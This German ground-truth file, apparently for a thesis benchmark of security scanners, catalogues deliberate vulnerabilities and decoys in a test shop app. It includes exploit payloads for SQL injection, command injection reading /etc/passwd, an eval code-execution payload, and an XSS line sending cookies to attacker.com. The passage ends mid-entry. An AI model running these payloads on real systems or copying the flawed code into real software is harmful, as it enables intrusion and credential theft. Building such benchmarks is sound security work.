# Ground Truth — Vulnerable Shop
> **Status:** FINAL — Zeilennummern verifiziert gegen `clean/src/` (Stand 2026-05-12)  
> **Zweck:** Bachelorthesis-Benchmark für SAST / DAST / SCA Tools  
> **WARNUNG:** Diese App enthält absichtliche Sicherheitslücken. NICHT auf öffentlichen Servern deployen.

---

## Übersicht

| Kategorie | Anzahl |
|---|---|
| Echte Schwachstellen | 20 |
| False-Positive-Köder | 10 |
| **Gesamt sicherheitsrelevante Stellen** | **30** |

Aufschlüsselung nach Tool-Kategorie:

| Tool-Typ | Echte Lücken | Köder |
|---|---|---|
| SAST (Code-Pattern) | 8 (V01–V08) | 6 (K01–K06) |
| DAST (Runtime) | 7 (V09–V15) | 2 (K07, K10) |
| SCA (Dependencies) | 5 (V16–V20) | 2 (K08, K09) |

---

## Echte Schwachstellen

---

### V01 — SQL Injection (klassisch, String-Concatenation)

- **CWE:** CWE-89 — Improper Neutralization of Special Elements used in an SQL Command
- **OWASP Top 10 2021:** A03 — Injection
- **Datei:** `src/routes/auth.js`
- **Zeile(n):** TBD (Login-Handler, ca. Zeile 20–30)
- **Marker:** `[VULN-V01]`
- **Typ:** SAST + DAST detektierbar
- **Erwartete Detektion:**
  - SAST: Semgrep (`javascript.lang.security.audit.sqli`), CodeQL (`js/sql-injection`), SonarQube (Taint-Analyse)
  - DAST: OWASP ZAP (Active Scan — SQL Injection), Burp Suite (Scanner)
- **Beschreibung:** Der Login-Endpoint baut die SQL-Query per String-Concatenation mit dem unvalidierten `req.body.username`. Kein Prepared Statement, kein Escaping.
- **Code-Muster:**
  ```javascript
  const query = "SELECT * FROM users WHERE username = '" + req.body.username + "' AND password_hash = '" + hash + "'";
  db.get(query, callback);
  ```
- **Exploit:** `username = admin' OR '1'='1' --` → Login ohne Passwort als erster User in der DB
- **Severity:** Kritisch

---

### V02 — SQL Injection (verteilt über zwei Funktionen, Template Literal)

- **CWE:** CWE-89
- **OWASP Top 10 2021:** A03 — Injection
- **Dateien:** `src/routes/products.js` + `src/models/db.js`
- **Zeile(n):** TBD (Zeilen im jeweiligen File, Funktion `buildSearchQuery` in db.js, Aufruf in products.js)
- **Marker:** `[VULN-V02]`
- **Typ:** SAST + DAST detektierbar (für SAST schwieriger, da Taint-Tracking über Funktionsgrenzen nötig)
- **Erwartete Detektion:**
  - SAST: CodeQL (interprozedurales Taint-Tracking), SonarQube (mit tiefem Taint); Semgrep (lokale Rules) wird diese **wahrscheinlich verpassen** → guter TP/FN-Indikator
  - DAST: ZAP, Burp (Active Scan auf `/products/search?q=`)
- **Beschreibung:** Der Suchterm aus `req.query.q` wird an eine Hilfsfunktion `buildSearchQuery(term)` in `db.js` übergeben. Diese baut den SQL-String via Template Literal. Die Verwundbarkeit ist auf zwei Funktionen verteilt — erfordert interprozedurales Taint-Tracking.
- **Code-Muster:**
  ```javascript
  // products.js
  const sql = buildSearchQuery(req.query.q);
  db.all(sql, callback);

  // db.js
  function buildSearchQuery(term) {
    return `SELECT * FROM products WHERE name LIKE '%${term}%' OR description LIKE '%${term}%'`;
  }
  ```
- **Exploit:** `GET /products/search?q=' UNION SELECT username,password_hash,null,null,null FROM users --`
- **Severity:** Kritisch

---

### V03 — Stored Cross-Site Scripting (XSS)

- **CWE:** CWE-79 — Improper Neutralization of Input During Web Page Generation
- **OWASP Top 10 2021:** A03 — Injection
- **Datei:** `src/routes/reviews.js` + `src/views/product.ejs`
- **Zeile(n):** TBD (POST-Handler in reviews.js, Render-Zeile in product.ejs)
- **Marker:** `[VULN-V03]`
- **Typ:** SAST + DAST detektierbar
- **Erwartete Detektion:**
  - SAST: Semgrep (EJS `<%-` unescaped output), SonarQube; CodeQL (js/xss)
  - DAST: ZAP (Stored XSS), Burp (Passive + Active Scan)
- **Beschreibung:** Review-Inhalt wird beim Speichern nicht sanitisiert und beim Rendern mit dem EJS-Operator `<%-` (unescaped) ausgegeben. Angreifer kann beliebiges HTML/JS speichern, das bei jedem Seitenaufruf ausgeführt wird.
- **Code-Muster:**
  ```ejs
  <!-- product.ejs — unescaped output -->
  <p class="review-text"><%- review.content %></p>
  ```
- **Exploit:** POST `/api/reviews` mit `content = <script>document.location='https://attacker.com/steal?c='+document.cookie</script>`
- **Severity:** Hoch

---

### V04 — Reflected Cross-Site Scripting (XSS)

- **CWE:** CWE-79
- **OWASP Top 10 2021:** A03 — Injection
- **Datei:** `src/routes/products.js` + `src/views/search.ejs`
- **Zeile(n):** TBD (GET /products/search Handler, Render-Zeile in search.ejs)
- **Marker:** `[VULN-V04]`
- **Typ:** SAST + DAST detektierbar
- **Erwartete Detektion:**
  - SAST: Semgrep, SonarQube, CodeQL
  - DAST: ZAP (Reflected XSS), Burp
- **Beschreibung:** Der Suchbegriff aus `req.query.q` wird ohne Escaping in die Antwort gerendert (`<%-`). Kein Output-Encoding auf dem reflektierten Parameter.
- **Code-Muster:**
  ```ejs
  <!-- search.ejs -->
  <p>Suchergebnisse für: <%- searchTerm %></p>
  ```
- **Exploit:** `GET /products/search?q=<script>alert(document.domain)</script>`
- **Severity:** Mittel–Hoch

---

### V05 — Command Injection

- **CWE:** CWE-78 — Improper Neutralization of Special Elements used in an OS Command
- **OWASP Top 10 2021:** A03 — Injection
- **Datei:** `src/routes/export.js`
- **Zeile(n):** TBD (POST /api/admin/export Handler)
- **Marker:** `[VULN-V05]`
- **Typ:** SAST + DAST detektierbar
- **Erwartete Detektion:**
  - SAST: Semgrep (`child-process-injection`), CodeQL (`js/shell-command-injection`), SonarQube
  - DAST: ZAP (Remote OS Command Injection), Burp
- **Beschreibung:** Der Admin-Export-Endpoint nimmt einen `filename`-Parameter aus `req.body` und übergibt ihn direkt an `child_process.exec()`. Kein Sanitizing, kein Shell-Escaping.
- **Code-Muster:**
  ```javascript
  const { exec } = require('child_process');
  const filename = req.body.filename;
  exec(`zip /tmp/exports/${filename}.zip /tmp/exports/${filename}`, callback);
  ```
- **Exploit:** `POST /api/admin/export` mit `filename = report; cat /etc/passwd > /tmp/exports/out.txt`
- **Severity:** Kritisch

---

### V06 — Path Traversal

- **CWE:** CWE-22 — Improper Limitation of a Pathname to a Restricted Directory
- **OWASP Top 10 2021:** A01 — Broken Access Control
- **Datei:** `src/routes/profile.js`
- **Zeile(n):** TBD (GET /api/avatar/:filename Handler)
- **Marker:** `[VULN-V06]`
- **Typ:** SAST + DAST detektierbar
- **Erwartete Detektion:**
  - SAST: Semgrep (`path-traversal`), CodeQL (`js/path-injection`)
  - DAST: ZAP (Path Traversal), Burp
- **Beschreibung:** Der Dateiname für den Avatar-Download wird direkt aus `req.params.filename` genommen und per `path.join()` mit dem Upload-Verzeichnis kombiniert — ohne Normalisierung oder Boundary-Check. `../`-Sequenzen werden nicht gefiltert.
- **Code-Muster:**
  ```javascript
  const filePath = path.join(__dirname, '../uploads/avatars', req.params.filename);
  fs.readFile(filePath, (err, data) => res.send(data));
  ```
- **Exploit:** `GET /api/avatar/../../../etc/passwd`
- **Severity:** Hoch

---

### V07 — Insecure Deserialization

- **CWE:** CWE-502 — Deserialization of Untrusted Data
- **OWASP Top 10 2021:** A08 — Software and Data Integrity Failures
- **Datei:** `src/routes/orders.js`
- **Zeile(n):** TBD (POST /api/cart/import Handler)
- **Marker:** `[VULN-V07]`
- **Typ:** SAST detektierbar (eval mit User-Input)
- **Erwartete Detektion:**
  - SAST: Semgrep (`eval-with-user-input`), CodeQL (`js/code-injection`), SonarQube
  - DAST: Schwer automatisch erkennbar (erfordert bekanntes Payload-Format)
- **Beschreibung:** Ein „Warenkorb importieren"-Feature akzeptiert Base64-enkodierte Warenkorbdaten und deserialisiert diese via `eval()`. Ein Angreifer kann eine Payload einschleusen, die beim Deserialisieren beliebigen JS-Code ausführt (IIFE-Muster).
- **Code-Muster:**
  ```javascript
  const cartData = Buffer.from(req.body.cartData, 'base64').toString('utf8');
  const cart = eval('(' + cartData + ')');  // Unsichere Deserialisierung
  ```
- **Exploit:** Base64(`(function(){require('child_process').exec('id > /tmp/pwned');}())`) als `cartData`
- **Severity:** Kritisch

---

### V08 — Hardcoded Secret (JWT Secret)

- **CWE:** CWE-798 — Use of Hard-coded Credentials
- **OWASP Top 10 2021:** A07 — Identification and Authentication Failures
- **Datei:** `src/middleware/auth.js`
- **Zeile(n):** TBD (Konstante direkt im File, ca. Zeile 3–5)
- **Marker:** `[VULN-V08]`
- **Typ:** SAST detektierbar
- **Erwartete Detektion:**
  - SAST: Semgrep (hardcoded secrets / entropy scan), SonarQube (hotspot), Gitleaks / TruffleHog (Secret Scanning)
  - DAST: Indirekt — wenn Secret bekannt, können gültige JWTs gefälscht werden
- **Beschreibung:** Das JWT-Signing-Secret ist als String-Literal im Code hartcodiert statt aus Umgebungsvariablen gelesen. Jeder mit Code-Zugang kann beliebige JWTs signieren.
- **Code-Muster:**
  ```javascript
  const JWT_SECRET = 'sh0pS3cr3t!2024';  // Hardcoded — sollte process.env.JWT_SECRET sein
  ```
- **Severity:** Hoch

---

### V09 — Broken Authentication (Password Reset ohne Token-Validierung)

- **CWE:** CWE-287 — Improper Authentication
- **OWASP Top 10 2021:** A07 — Identification and Authentication Failures
- **Datei:** `src/routes/auth.js`
- **Zeile(n):** TBD (POST /api/auth/reset-password Handler)
- **Marker:** `[VULN-V09]`
- **Typ:** DAST detektierbar
- **Erwartete Detektion:**
  - DAST: ZAP (ggf. via Custom Script), Burp (manuelle Analyse / Custom Scan); automatische Erkennung schwierig ohne Business-Logic-Kontext
  - SAST: Möglicherweise durch Code-Flow-Analyse erkennbar (kein Token-Check)
- **Beschreibung:** Der Passwort-Reset-Endpoint akzeptiert `email` + `newPassword` ohne Reset-Token-Validierung. Es wird lediglich geprüft, ob die E-Mail existiert — kein zeitlich limitiertes One-Time-Token required.
- **Code-Muster:**
  ```javascript
  // Kein Token-Check — nur E-Mail-Existenzprüfung
  const user = await db.get('SELECT * FROM users WHERE email = ?', [email]);
  if (user) {
    await db.run('UPDATE users SET password_hash = ? WHERE email = ?', [hash, email]);
  }
  ```
- **Exploit:** `POST /api/auth/reset-password` mit `{ email: "admin@shop.local", newPassword: "hacked" }` — kein Token nötig
- **Severity:** Kritisch

---

### V10 — IDOR / Broken Object-Level Access Control

- **CWE:** CWE-639 — Authorization Bypass Through User-Controlled Key
- **OWASP Top 10 2021:** A01 — Broken Access Control
- **Datei:** `src/routes/orders.js`
- **Zeile(n):** TBD (GET /api/orders/:id Handler)
- **Marker:** `[VULN-V10]`
- **Typ:** DAST detektierbar
- **Erwartete Detektion:**
  - DAST: ZAP (IDOR via parameter tampering), Burp (IDOR-Detection via Auth-Tests)
  - SAST: Schwer erkennbar (kein User-ID-Check im Code)
- **Beschreibung:** Der Endpoint liefert eine Bestellung zurück, wenn der User eingeloggt ist — aber es wird nicht geprüft, ob die Bestellung dem anfragenden User gehört. Jeder authentifizierte User kann beliebige Order-IDs abfragen.
- **Code-Muster:**
  ```javascript
  // Kein WHERE user_id = req.user.id check!
  const order = await db.get('SELECT * FROM orders WHERE id = ?', [req.params.id]);
  res.json(order);
  ```
- **Exploit:** Eingeloggt als User B → `GET /api/orders/1` liefert die Bestellung von User A
- **Severity:** Hoch

---

### V11 — Missing Authorization (Admin-Endpoint ohne Rollen-Check)

- **CWE:** CWE-862 — Missing Authorization
- **OWASP Top 10 2021:** A01 — Broken Access Control
- **Datei:** `src/routes/admin.js`
- **Zeile(n):** TBD (GET /admin/users und GET /admin/orders Handler)
- **Marker:** `[VULN-V11]`
- **Typ:** DAST detektierbar
- **Erwartete Detektion:**
  - DAST: ZAP (Forced Browsing / Access Control Test), Burp (Broken Access Control Scanner)
  - SAST: Code-Review erkennbar (fehlendes `isAdmin`-Check im Middleware-Stack)
- **Beschreibung:** Die Admin-Routen sind zwar hinter `requireAuth` (Login nötig), aber es fehlt eine `requireAdmin`-Middleware. Jeder eingeloggte User kann die Admin-Seite mit der vollständigen User- und Bestellliste aufrufen.
- **Code-Muster:**
  ```javascript
  // requireAuth vorhanden, requireAdmin FEHLT
  router.get('/users', requireAuth, async (req, res) => {
    const users = await db.all('SELECT * FROM users');
    res.render('admin/users', { users });
  });
  ```
- **Exploit:** Normaler User-Account → `GET /admin/users` → Vollständige User-Liste inklusive Passwort-Hashes
- **Severity:** Hoch

---

### V12 — Open Redirect

- **CWE:** CWE-601 — URL Redirection to Untrusted Site ('Open Redirect')
- **OWASP Top 10 2021:** A01 — Broken Access Control
- **Datei:** `src/routes/auth.js`
- **Zeile(n):** TBD (POST /api/auth/login Handler, `next`-Parameter-Auswertung)
- **Marker:** `[VULN-V12]`
- **Typ:** DAST detektierbar
- **Erwartete Detektion:**
  - DAST: ZAP (Open Redirect), Burp (Passive + Active Scan)
  - SAST: Semgrep (unvalidated-redirect)
- **Beschreibung:** Nach erfolgreichem Login wird `req.query.next` ohne Validierung als Redirect-Ziel verwendet. Jede beliebige externe URL wird akzeptiert — ermöglicht Phishing-Attacken.
- **Code-Muster:**
  ```javascript
  const redirectTo = req.query.next || '/products';
  res.redirect(redirectTo);  // Kein URL-Whitelisting
  ```
- **Exploit:** `POST /api/auth/login?next=https://evil.example.com` → nach Login Weiterleitung zu Angreifer-Site
- **Severity:** Mittel

---

### V13 — Cross-Site Request Forgery (CSRF)

- **CWE:** CWE-352 — Cross-Site Request Forgery
- **OWASP Top 10 2021:** A01 — Broken Access Control
- **Datei:** `src/routes/profile.js`
- **Zeile(n):** TBD (POST /api/profile/update Handler)
- **Marker:** `[VULN-V13]`
- **Typ:** DAST detektierbar
- **Erwartete Detektion:**
  - DAST: ZAP (CSRF-Token-Analyse), Burp (CSRF PoC Generator)
  - SAST: Schwer; nur erkennbar wenn bekannt ist, dass kein CSRF-Middleware registriert ist
- **Beschreibung:** Der Profil-Update-Endpoint (Name, E-Mail-Änderung) prüft kein CSRF-Token und setzt kein `SameSite`-Cookie-Attribut. Eine fremde Website kann den Endpoint im Browser des Opfers aufrufen.
- **Code-Muster:**
  ```html
  <!-- Angreifer-Seite -->
  <form action="http://localhost:3000/api/profile/update" method="POST">
    <input name="email" value="attacker@evil.com">
  </form>
  <script>document.forms[0].submit()</script>
  ```
- **Exploit:** Opfer besucht präparierte Seite → E-Mail-Adresse des Accounts wird geändert
- **Severity:** Mittel

---

### V14 — Security Misconfiguration (fehlende Headers + Stack-Trace-Leakage)

- **CWE:** CWE-16 — Configuration
- **OWASP Top 10 2021:** A05 — Security Misconfiguration
- **Datei:** `src/app.js`
- **Zeile(n):** TBD (Express-Setup, Error-Handler am Ende der Datei)
- **Marker:** `[VULN-V14]`
- **Typ:** DAST detektierbar
- **Erwartete Detektion:**
  - DAST: ZAP (Passive Scan — Missing Anti-clickjacking Header, X-Content-Type-Options, etc.), Burp
  - SAST: SonarQube (Security Hotspot — keine helmet-Middleware); Semgrep (express-without-helmet)
- **Beschreibung:** Die App verwendet weder `helmet` noch andere Security-Header-Middleware. Außerdem gibt der globale Error-Handler den vollständigen Stack-Trace in der HTTP-Response zurück, was interne Pfade und Abhängigkeiten offenbart.
  - Fehlend: `X-Frame-Options`, `X-Content-Type-Options`, `Content-Security-Policy`, `Strict-Transport-Security`
  - `X-Powered-By: Express` Header aktiv
- **Code-Muster:**
  ```javascript
  // Kein helmet(), kein removeHeader('X-Powered-By')
  app.use((err, req, res, next) => {
    res.status(500).json({ error: err.message, stack: err.stack });
  });
  ```
- **Exploit:** Beliebige fehlerhafte Anfrage → vollständiger Stack-Trace in Antwort
- **Severity:** Mittel

---

### V15 — Sensitive Data Exposure (Passwort-Hash in API-Response)

- **CWE:** CWE-200 — Exposure of Sensitive Information to an Unauthorized Actor
- **OWASP Top 10 2021:** A02 — Cryptographic Failures / A01 — Broken Access Control
- **Datei:** `src/routes/admin.js`
- **Zeile(n):** TBD (GET /admin/users — User-Listing ohne Field-Filterung)
- **Marker:** `[VULN-V15]`
- **Typ:** DAST detektierbar
- **Erwartete Detektion:**
  - DAST: ZAP (Passive Scan — Sensitive Data in Response), Burp (Information Disclosure)
  - SAST: Schwer (kontextabhängig)
- **Beschreibung:** Der Admin-Endpoint für die User-Liste gibt das `password_hash`-Feld direkt aus der DB zurück, ohne es aus der Response zu entfernen. In Kombination mit V11 (fehlender Rollen-Check) kann jeder eingeloggte User die Hashes aller Passwörter abrufen.
- **Code-Muster:**
  ```javascript
  // SELECT * gibt auch password_hash zurück — kein SELECT id, username, email
  const users = await db.all('SELECT * FROM users');
  res.json(users);  // Enthält password_hash!
  ```
- **Exploit:** `GET /admin/users` → JSON-Response mit `password_hash`-Feld für alle User
- **Severity:** Hoch

---

### V16 — SCA: lodash@4.17.20 (Prototype Pollution / Template Injection)

- **CWE:** CWE-1321 — Improperly Controlled Modification of Object Prototype Attributes (Prototype Pollution)
- **OWASP Top 10 2021:** A06 — Vulnerable and Outdated Components
- **Datei:** `package.json` + `src/routes/profile.js` (Verwendung)
- **CVEs:**
  - `GHSA-jf85-cpcp-j695` / CVE-2021-23337 — lodash template-Funktion ermöglicht Command Injection via Optionen
  - `GHSA-p6mc-m468-83gw` — Prototype Pollution via `zipObjectDeep`
- **Marker:** `[VULN-V16]`
- **Typ:** SCA detektierbar
- **Erwartete Detektion:** npm audit, Snyk, OWASP Dependency-Check, GitHub Dependabot
- **Beschreibung:** `lodash@4.17.20` ist eine Version unterhalb des Fixes (4.17.21). Die App verwendet `_.merge()` für das Zusammenführen von User-Einstellungen (Prototyp-Pollution-Vektor) und `_.template()` für eine E-Mail-Vorlage (Template-Injection-Vektor).
- **Verwendung im Code:**
  ```javascript
  // profile.js — lodash.merge für User-Settings (Prototype Pollution)
  const updatedSettings = _.merge({}, defaultSettings, req.body.settings);
  // Payload: settings[__proto__][isAdmin]=true
  ```
- **Severity:** Hoch (je nach Reachability)

---

### V17 — SCA: jsonwebtoken@8.5.1 (Mehrere CVEs)

- **CWE:** CWE-327 — Use of a Broken or Risky Cryptographic Algorithm / CWE-290 — Authentication Bypass
- **OWASP Top 10 2021:** A06 — Vulnerable and Outdated Components
- **Datei:** `package.json` + `src/middleware/auth.js` (Verwendung)
- **CVEs:**
  - CVE-2022-23529 — Remote Code Execution wenn `secretOrPublicKey` ein Objekt ist
  - CVE-2022-23540 — Akzeptiert unsichere Algorithmen (z.B. `none`)
  - CVE-2022-23541 — Privilege Escalation via Public Key als HMAC-Secret missbraucht
- **Marker:** `[VULN-V17]`
- **Typ:** SCA detektierbar
- **Erwartete Detektion:** npm audit, Snyk (High/Critical), OWASP Dependency-Check
- **Beschreibung:** `jsonwebtoken@8.5.1` hat mehrere kritische Schwachstellen. Die App verwendet es für JWT-Signierung und -Verifikation (V08 liefert dazu ein hardcoded Secret).
- **Verwendung im Code:** Auth-Middleware für `jwt.sign()` und `jwt.verify()` bei allen API-Aufrufen
- **Severity:** Kritisch

---

### V18 — SCA: express@4.16.0 (transitive CVEs via qs + path-to-regexp)

- **CWE:** CWE-1321 (qs Prototype Pollution) / CWE-400 (path-to-regexp ReDoS)
- **OWASP Top 10 2021:** A06 — Vulnerable and Outdated Components
- **Datei:** `package.json`
- **CVEs (transitiv):**
  - CVE-2022-24999 — `qs` Prototype Pollution (qs < 6.10.3, verwendet durch Express intern)
  - CVE-2024-45296 — `path-to-regexp` ReDoS (path-to-regexp < 0.1.12 / 1.x < 6.3.0, Express 4.x verwendet 0.1.x)
- **Marker:** `[VULN-V18]`
- **Typ:** SCA detektierbar
- **Erwartete Detektion:** npm audit (listet transitive Dependencies), Snyk, OWASP Dependency-Check
- **Beschreibung:** Express 4.16.0 zieht veraltete Versionen von `qs` und `path-to-regexp` als transitive Dependencies. SCA-Tools sollten dies im Dependency-Graph erkennen.
- **Severity:** Mittel (qs: Hoch)

---

### V19 — SCA: marked@0.3.6 (ReDoS + XSS)

- **CWE:** CWE-400 (ReDoS) / CWE-79 (XSS)
- **OWASP Top 10 2021:** A06 — Vulnerable and Outdated Components
- **Datei:** `package.json` + `src/routes/products.js` (Verwendung für Produktbeschreibungen)
- **CVEs:**
  - CVE-2022-21680 — ReDoS via `codespan`
  - CVE-2022-21681 — ReDoS via `inline`
  - Weitere ältere XSS-Issues in 0.3.x (kein sanitizing von HTML in Markdown)
- **Marker:** `[VULN-V19]`
- **Typ:** SCA detektierbar
- **Erwartete Detektion:** npm audit (Critical), Snyk, OWASP Dependency-Check
- **Beschreibung:** `marked@0.3.6` ist eine stark veraltete Version. Die App rendert Produktbeschreibungen als Markdown — durch die ReDoS-Schwachstellen kann ein Angreifer mit manipuliertem Markdown den Event-Loop blockieren.
- **Verwendung im Code:**
  ```javascript
  // products.js
  const descriptionHtml = marked(product.description);
  ```
- **Severity:** Hoch

---

### V20 — SCA: axios@0.21.0 (SSRF via Redirect-Following)

- **CWE:** CWE-918 — Server-Side Request Forgery (SSRF)
- **OWASP Top 10 2021:** A10 — Server-Side Request Forgery / A06 — Vulnerable and Outdated Components
- **Datei:** `package.json` + `src/routes/products.js` (Verwendung für Produkt-Bild-Proxy)
- **CVEs:**
  - CVE-2021-3749 — axios folgt Redirects ohne Protokoll-Validierung → SSRF (Redirect auf `file://` oder interne IPs möglich)
- **Marker:** `[VULN-V20]`
- **Typ:** SCA detektierbar (+ DAST wenn Proxy-Endpoint erreichbar)
- **Erwartete Detektion:** npm audit, Snyk; DAST nur wenn Proxy-Endpoint im Scope
- **Beschreibung:** `axios@0.21.0` ist anfällig für SSRF via open redirect following. Die App verwendet axios für einen internen Bild-Proxy-Endpoint — ein Angreifer kann durch manipulierte URLs den Server dazu bringen, interne Ressourcen abzurufen.
- **Verwendung im Code:**
  ```javascript
  // Bild-Proxy in products.js
  const response = await axios.get(req.query.imageUrl);
  ```
- **Severity:** Hoch

---

## False-Positive-Köder

---

### K01 — SQL Template Literal mit hardcodierter Konstante (sieht aus wie SQLi)

- **Datei:** `src/routes/products.js`
- **Zeile(n):** TBD (Kategorie-Filter-Funktion)
- **Marker:** `[DECOY-K01]`
- **Beschreibung:** Template Literal in einer DB-Query — sieht nach SQL Injection aus, aber der interpolierte Wert ist eine hartcodierte Konstante, kein User-Input.
- **Code-Muster:**
  ```javascript
  const FEATURED_CATEGORY = 'featured';
  const query = `SELECT * FROM products WHERE category = '${FEATURED_CATEGORY}' AND active = 1`;
  ```
- **Warum sicher:** `FEATURED_CATEGORY` ist ein hartcodierter String im gleichen Scope — kein User-Input fließt in die Query
- **Erwartete FP-Erkennung:** Naive Semgrep-Rules (Pattern: Template Literal in SQL) werden hier einen FP melden; kontextbewusste Rules (die prüfen, ob der Wert User-Input ist) nicht
- **Aussagekraft:** Testet ob SAST-Tool zwischen „Template Literal" und „User-Input in Template Literal" unterscheiden kann

---

### K02 — `eval()` auf hartcodierten String (sieht aus wie Code Injection)

- **Datei:** `src/app.js`
- **Zeile(n):** TBD (App-Initialisierung)
- **Marker:** `[DECOY-K02]`
- **Beschreibung:** `eval()` Aufruf, der einem SAST-Tool sofort als Code Injection auffällt — aber der Input ist ein string literal, kein User-Input.
- **Code-Muster:**
  ```javascript
  const appConfig = eval('({ env: "development", debug: false, version: "1.0.0" })');
  ```
- **Warum sicher:** Vollständig hardcodierter String ohne externe Daten; Equivalent zu einem direkten Objekt-Literal
- **Erwartete FP-Erkennung:** Alle Tools, die `eval()` als Hotspot flaggen, ohne Taint-Tracking

---

### K03 — `child_process.exec()` ohne User-Input (sieht aus wie Command Injection)

- **Datei:** `src/routes/export.js`
- **Zeile(n):** TBD (Housekeeping-Funktion für alte Exports)
- **Marker:** `[DECOY-K03]`
- **Beschreibung:** `exec()` Aufruf mit vollständig hardcodiertem Kommando zum Aufräumen von temp-Dateien.
- **Code-Muster:**
  ```javascript
  exec('find /tmp/exports -name "*.zip" -mtime +7 -delete', (err) => {
    if (err) logger.error('Cleanup failed:', err.message);
  });
  ```
- **Warum sicher:** Kein User-Input im Kommando; vollständig statischer String
- **Erwartete FP-Erkennung:** Tools die `child_process.exec` pauschal flaggen (ohne Taint-Check)

---

### K04 — EJS `<%= %>` sieht aus wie XSS, ist aber escaped

- **Datei:** `src/views/search.ejs`
- **Zeile(n):** TBD (neben der echten V04-Lücke mit `<%-`)
- **Marker:** `[DECOY-K04]`
- **Beschreibung:** Direkt neben dem verwundbaren `<%-`-Aufruf (V04) steht ein `<%= %>`-Aufruf für einen anderen Parameter — dieser ist korrekt escaped.
- **Code-Muster:**
  ```ejs
  <!-- Sicher — EJS escaped automatisch: & → &amp; etc. -->
  <p>Kategorie: <%= category %></p>
  <!-- Unsicher — V04 -->
  <p>Suche: <%- searchTerm %></p>
  ```
- **Warum sicher:** EJS `<%= %>` führt HTML-Escaping durch (`<`, `>`, `"`, `'`, `&` → Entities)
- **Erwartete FP-Erkennung:** Tools die EJS-Output-Expressions pauschal ohne Unterscheidung `<%-` vs `<%=` flaggen

---

### K05 — `req.params.id` direkt in DB-Aufruf — aber Prepared Statement

- **Datei:** `src/routes/orders.js`
- **Zeile(n):** TBD (separater Endpoint GET /api/orders/:id/invoice)
- **Marker:** `[DECOY-K05]`
- **Beschreibung:** `req.params.id` fließt direkt in einen DB-Aufruf — sieht nach SQLi aus, ist aber über parametrisiertes Prepared Statement abgesichert.
- **Code-Muster:**
  ```javascript
  // Sicher — req.params.id als Parameter, nicht als String-Concat
  const invoice = await db.get(
    'SELECT * FROM orders WHERE id = ? AND status = ?',
    [req.params.id, 'completed']
  );
  ```
- **Warum sicher:** SQLite `?`-Platzhalter werden vom Driver escaped; kein String-Concat
- **Erwartete FP-Erkennung:** Pattern-basierte Tools die nur `req.params` → SQL-Aufruf-Nähe prüfen

---

### K06 — `fs.readFile` mit `req.query` — aber Whitelist-Prüfung davor

- **Datei:** `src/routes/profile.js`
- **Zeile(n):** TBD (GET /api/themes/:name Endpoint für UI-Themes)
- **Marker:** `[DECOY-K06]`
- **Beschreibung:** `req.params.name` wird in einem `fs.readFile`-Aufruf verwendet — sieht nach Path Traversal aus (vgl. V06), ist aber durch eine explizite Whitelist abgesichert.
- **Code-Muster:**
  ```javascript
  const ALLOWED_THEMES = ['default', 'dark', 'light', 'contrast'];
  const themeName = req.params.name;
  if (!ALLOWED_THEMES.includes(themeName)) {
    return res.status(400).json({ error: 'Invalid theme' });
  }
  const themePath = path.join(__dirname, '../public/themes', `${themeName}.css`);
  fs.readFile(themePath, 'utf8', (err, data) => res.send(data));
  ```
- **Warum sicher:** Whitelist-Check verhindert `../`-Traversal; nur bekannte Werte gelangen in den Pfad
- **Erwartete FP-Erkennung:** Tools die `fs.readFile(req.*)` pauschal als Path Traversal flaggen

---

### K07 — `res.redirect(req.query.url)` — aber Allowlist-Validierung

- **Datei:** `src/routes/auth.js`
- **Zeile(n):** TBD (GET /api/auth/logout — Post-Logout-Redirect)
- **Marker:** `[DECOY-K07]`
- **Beschreibung:** Nach Logout wird `req.query.returnTo` als Redirect-Ziel verwendet — sieht nach Open Redirect aus (vgl. V12), aber mit Allowlist-Validierung.
- **Code-Muster:**
  ```javascript
  const ALLOWED_RETURN_PATHS = ['/', '/products', '/login'];
  const returnTo = req.query.returnTo || '/';
  if (!ALLOWED_RETURN_PATHS.includes(returnTo)) {
    return res.redirect('/');
  }
  res.redirect(returnTo);
  ```
- **Warum sicher:** Nur explizit erlaubte interne Pfade werden akzeptiert; externe URLs schlagen fehl
- **Erwartete FP-Erkennung:** Tools die `res.redirect(req.query.*)` pauschal ohne Kontextprüfung flaggen

---

### K08 — Hartcodierter String sieht aus wie ein Secret — ist Test-Fixture

- **Datei:** `src/models/db.js`
- **Zeile(n):** TBD (Seed-Daten oder Initialisierung)
- **Marker:** `[DECOY-K08]`
- **Beschreibung:** Ein hartcodierter String mit hoher Entropie sieht für Secret-Scanner nach einem API-Key aus — ist aber ein klar als Test-Fixture gelabelter Wert (RSA Public Key Prefix oder explizit markiert).
- **Code-Muster:**
  ```javascript
  // Test fixture — not a real credential, public key for local JWT verification testing
  const TEST_PUBLIC_KEY = 'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA' +
    'test_fixture_not_a_real_key_do_not_use_in_production_0000000000000000';
  ```
- **Warum sicher:** Kein echter Credential; explizit als Test-Fixture gelabelt; der String-Wert ist kein valider Key
- **Erwartete FP-Erkennung:** Entropy-basierte Secret-Scanner (Gitleaks, TruffleHog) können dies flaggen; kontextbewusste Tools (die Kommentare und Kontext auswerten) nicht

---

### K09 — `Math.random()` für nicht-sicherheitsrelevante UI-ID

- **Datei:** `src/routes/products.js`
- **Zeile(n):** TBD (Produkt-Listing-Handler)
- **Marker:** `[DECOY-K09]`
- **Beschreibung:** `Math.random()` erzeugt eine ID für ein Frontend-UI-Element (z.B. Accordion-Komponente, Carousel-Slide-ID) — nicht für Tokens, Sessions oder andere sicherheitsrelevante Zwecke.
- **Code-Muster:**
  ```javascript
  // Nur für HTML id-Attribute im Template — kein Sicherheitsbezug
  const carouselId = 'carousel-' + Math.floor(Math.random() * 10000);
  res.render('products', { products, carouselId });
  ```
- **Warum sicher:** `Math.random()` ist schwach für kryptographische Zwecke — hier wird es aber nur für DOM-Element-IDs zur Vermeidung von Konflikten genutzt
- **Erwartete FP-Erkennung:** Tools die `Math.random()` pauschal als CWE-330 (Insufficient Randomness) flaggen, ohne die Verwendung zu prüfen

---

### K10 — `JSON.parse(req.body.*)` ohne Schema-Validation — interner Auth-geschützter Endpoint

- **Datei:** `src/routes/admin.js`
- **Zeile(n):** TBD (POST /admin/settings — Admin-Konfiguration)
- **Marker:** `[DECOY-K10]`
- **Beschreibung:** Roher `JSON.parse()` auf Request-Body-Daten ohne Schema-Validation — sieht nach unsicherer Deserialisierung aus, ist aber hinter Admin-Auth und der Endpoint ist für interne Nutzung designed.
- **Code-Muster:**
  ```javascript
  // Hinter requireAuth + requireAdmin Middleware
